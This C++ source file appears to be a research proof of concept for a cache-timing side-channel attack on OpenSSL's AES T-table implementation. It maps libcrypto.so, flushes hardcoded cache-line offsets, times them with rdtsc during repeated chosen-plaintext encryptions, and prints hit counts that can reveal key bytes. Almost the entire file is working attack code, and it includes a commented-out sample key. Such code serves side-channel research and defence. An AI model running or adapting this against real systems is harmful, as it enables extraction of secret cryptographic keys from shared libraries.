#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <openssl/aes.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include "../../cacheutils.h"
#include <map>
#include <vector>

// this number varies on different systems
#define MIN_CACHE_HIT_CYCLES (150)

// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS (1000*10)

unsigned char key[] =
{
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  //0x51, 0x4d, 0xab, 0x12, 0xff, 0xdd, 0xb3, 0x32, 0x52, 0x8f, 0xbb, 0x1d, 0xec, 0x45, 0xce, 0xcc, 0x4f, 0x6e, 0x9c,
  //0x2a, 0x15, 0x5f, 0x5f, 0x0b, 0x25, 0x77, 0x6b, 0x70, 0xcd, 0xe2, 0xf7, 0x80
};

size_t sum;
size_t scount;

std::map<char*, std::map<size_t, size_t> > timings;

char* base;
char* probe;
char* end;

int main()
{
  int fd = open("./libcrypto.so", O_RDONLY);
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if (map_size & 0xFFF != 0)
  {
    map_size |= 0xFFF;
    map_size += 1;
  }
  base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
  end = base + size;

  unsigned char plaintext[] =
  {
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
  };
  unsigned char ciphertext[128];
  unsigned char restoredtext[128];

  AES_KEY key_struct;

  AES_set_encrypt_key(key, 128, &key_struct);

  uint64_t min_time = rdtsc();
  srand(min_time);
  sum = 0;
  for (size_t byte = 0; byte < 256; byte += 16)
  {
    plaintext[0] = byte;
    //plaintext[1] = byte;
    //plaintext[2] = byte;
    //plaintext[3] = byte;

    AES_encrypt(plaintext, ciphertext, &key_struct);

    for (probe = base + 0x16c940; probe < base + 0x16cd40; probe += 64) // hardcoded addresses (could be done dynamically)  
    {
      size_t count = 0;
      for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
      {
        sched_yield();
        for (size_t j = 1; j < 16; ++j)
          plaintext[j] = rand() % 256;
        flush(probe);
        AES_encrypt(plaintext, ciphertext, &key_struct);
        sched_yield();
        size_t time = rdtsc();
        flush(probe);
        size_t delta = rdtsc() - time;
        if (delta >= MIN_CACHE_HIT_CYCLES
                     + ((probe-base == 0x16c9c0 || probe-base == 0x16cac0 || probe-base == 0x16cbc0 || probe-base == 0x16cc80)? 0 : -6))
                     // this is a dirty hack, better: do 1 preprocessing run right after set_encrypt_key, find the 4 cache lines where you don't see
                     // any timing difference at all, these are the 4 offsets where you want to subtract the same slice difference you get from the
                     // histogram (-6 on my machine)
          ++count;
      }
      timings[probe][byte] = count;
    }
  }

  for (auto ait : timings)
  {
    printf("%p", (void*) (ait.first - base));
    for (auto kit : ait.second)
    {
      printf(",%lu", kit.second);
    }
    printf("\n");
  }

  close(fd);
  munmap(base, map_size);
  fflush(stdout);
  return 0;
}

